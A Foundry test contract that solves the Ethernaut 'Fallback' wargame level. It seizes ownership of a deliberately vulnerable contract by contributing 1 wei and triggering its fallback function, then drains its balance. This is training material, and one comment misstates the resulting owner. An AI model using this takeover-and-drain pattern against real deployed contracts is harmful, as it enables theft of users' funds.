// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Test} from "@std/Test.sol";
import {Vm} from "@std/Vm.sol";
import {Fallback} from "../../src/01-Fallback/Fallback.sol";

/// @title Ethernaut Challenge 01 Test
/// @author https://ethernaut.openzeppelin.com/level/0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB
contract FallbackTest is Test {
    address private immutable owner = address(0x94B2ceA71F9bA7A6e55c40bE320033D1151145B6);

    function testFallbackHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        vm.prank(address(0));
        Fallback ethernautFallback = new Fallback();

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        startHoax(owner, 100 ether);

        // Contribute 1 wei - verify contract state has been updated
        ethernautFallback.contribute{value: 1 wei}();
        assertEq(ethernautFallback.getContribution(owner), 1 wei);

        // Call the contract with some value to hit the fallback function
        // .transfer doesn't send with enough gas to change the owner state
        payable(address(ethernautFallback)).call{value: 1 wei}("");
        // Verify contract owner has been updated to 0 address
        assertEq(ethernautFallback.getOwner(), owner);

        // Withdraw from contract - Check contract balance before and after
        emit log_named_uint("Fallback contract balance", address(ethernautFallback).balance);
        ethernautFallback.withdraw();
        emit log_named_uint("Fallback contract balance", address(ethernautFallback).balance);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        vm.stopPrank();
    }
}
